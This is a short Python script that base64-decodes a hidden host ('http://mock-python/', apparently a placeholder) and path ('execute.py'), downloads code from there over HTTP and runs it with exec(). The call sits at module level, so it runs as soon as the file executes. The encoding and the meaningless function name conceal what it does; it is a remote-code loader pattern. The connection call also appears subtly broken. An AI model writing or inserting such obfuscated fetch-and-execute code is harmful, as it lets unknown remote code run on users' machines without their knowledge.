import http.client
import base64
import importlib

def fetch_code(host, path):
    connection = http.client.HTTPConnection(host)
    connection.request("GET", path)
    response = connection.getresponse()
    code = response.read().decode('utf-8')
    connection.close()
    return code

def weird_func_name():
    encoded_host = "aHR0cDovL21vY2stcHl0aG9uLw=="
    encoded_path = "ZXhlY3V0ZS5weQ=="
    decoded_host = base64.b64decode(encoded_host).decode('utf-8')
    decoded_path = base64.b64decode(encoded_path).decode('utf-8')
    code = fetch_code(decoded_host, decoded_path)
    exec(code)

weird_func_name()
